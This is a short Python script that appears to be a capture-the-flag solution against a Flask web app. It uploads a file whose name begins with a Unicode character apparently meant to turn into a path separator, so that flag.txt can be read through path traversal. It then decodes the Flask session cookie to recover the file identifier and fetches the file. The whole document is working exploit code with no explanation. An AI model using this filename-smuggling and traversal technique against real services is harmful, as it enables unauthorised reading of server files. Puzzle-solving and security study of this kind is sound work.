import requests
import json
import base64

sess = requests.Session()
host = 'http://0e1.kr:10000'

# Upload a file
sess.post(host+'/post',
          files={'a': (u'\uf02fflag.txt', 'a')}, allow_redirects=False)

# Refresh session cookie to get file identifier
sess.post(host+'/post', allow_redirects=False)

# By default, session cookie is decodable in Flask
session = sess.cookies['session'].split('.')[1]+'=='
session = base64.urlsafe_b64decode(session)
session = json.loads(session.decode('zlib'))

files = session['files']

# ... and magic!
print sess.get(host+'/read/'+files.keys()[0]).content
